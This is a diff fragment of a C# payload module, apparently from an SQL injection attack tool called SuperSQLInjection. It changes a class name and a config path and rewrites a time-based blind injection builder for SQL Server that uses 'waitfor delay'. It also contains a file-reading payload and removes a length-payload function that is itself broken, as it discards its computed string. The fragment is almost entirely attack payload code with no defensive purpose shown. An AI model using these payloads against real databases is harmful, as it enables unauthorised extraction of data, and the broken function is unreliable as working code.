@@ -5,10 +5,10 @@ using tools;
 
 namespace SuperSQLInjection.payload
 {
-    class MSSQL
+    class SQLServer
     {
         //加载对应配置(需要读取的环境变量)
-        public static String path = "config/sqlserver/ver.txt";
+        public static String path = "config/vers/sqlserver.txt";
         public static List<String> vers = FileTool.readFileToList(path);
 
 
@@ -84,9 +84,9 @@ namespace SuperSQLInjection.payload
         //读文件的的payload
         public static String file_content = "(select data from ssqlinjection)";
 
-        public static String getBoolCountBySleep(String data, int maxTime)
+        public static String getBoolDataBySleep(String data, int maxTime)
         {
-            return ";if(0x1=0x1" + data + ") waitfor delay '0:0:"+ maxTime + "'";
+            return " 1=1 if(" + data + ") waitfor delay '0:0:" + maxTime + "'";
         }
 
         /// <summary>
@@ -195,7 +195,7 @@ namespace SuperSQLInjection.payload
 
 
         /// <summary>
-        /// 调用前需调用setDataValue方法
+        /// 
         /// </summary>
         /// <param name="columnsLen">列长</param>
         /// <param name="showIndex">显示列</param>
@@ -242,20 +242,6 @@ namespace SuperSQLInjection.payload
             }
             sb.Remove(sb.Length - 28, 28);
             return sb.ToString();
-        }
-
-
-        /// <summary>
-        /// 值的长度
-        /// </summary>
-        /// <param name="dataPayload"></param>
-        /// <returns></returns>
-        public static String getBoolLengthPayLoad(String dataStr,int len)
-        {
-            
-            bool_length.Replace("{data}",unicode_value.Replace("{data}", dataStr)).Replace("{len}",len.ToString());
-
-            return dataStr;
         }
 
         /// <summary>
